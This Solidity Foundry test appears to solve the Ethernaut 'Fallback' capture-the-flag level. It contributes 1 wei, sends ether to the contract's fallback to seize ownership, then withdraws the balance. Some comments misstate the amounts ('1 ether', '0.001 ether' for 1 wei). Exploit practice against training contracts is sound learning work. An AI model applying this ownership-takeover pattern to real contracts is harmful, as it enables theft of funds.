// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Ethernaut} from "src/core/Ethernaut.sol";
import {FallbackFactory} from "src/levels/Fallback/FallbackFactory.sol";
import {Fallback} from "src/levels/Fallback/Fallback.sol";

contract FallbackTest is Test {
  Ethernaut internal ethernaut;
  address internal eoaAddress = address(100);

  function setUp() public {
    // Setup instance of the Ethernaut contract
    ethernaut = new Ethernaut();
    // Deal EOA address some ether
    vm.deal(eoaAddress, 5 ether);
  }

  function testFallbackHack() public {
    /////////////////
    // LEVEL SETUP //
    /////////////////
    FallbackFactory fallbackFactory = new FallbackFactory();
    ethernaut.registerLevel(fallbackFactory);
    vm.startPrank(eoaAddress);
    address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
    Fallback ethernautFallback = Fallback(payable(levelAddress));

    //////////////////
    // LEVEL ATTACK //
    //////////////////
    // Send 1 ether to the fallback function
    ethernautFallback.contribute{value: 1 wei}();
    assertEq(
      ethernautFallback.getContribution(),
      1 wei,
      "contribution should be 0.001 ether"
    );

    // Send 1 ether to the fallback function
    payable(address(ethernautFallback)).call{value: 1 wei}("");
    ethernautFallback.withdraw();

    //////////////////////
    // LEVEL SUBMISSION //
    //////////////////////
    bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(levelSuccessfullyPassed);
  }
}
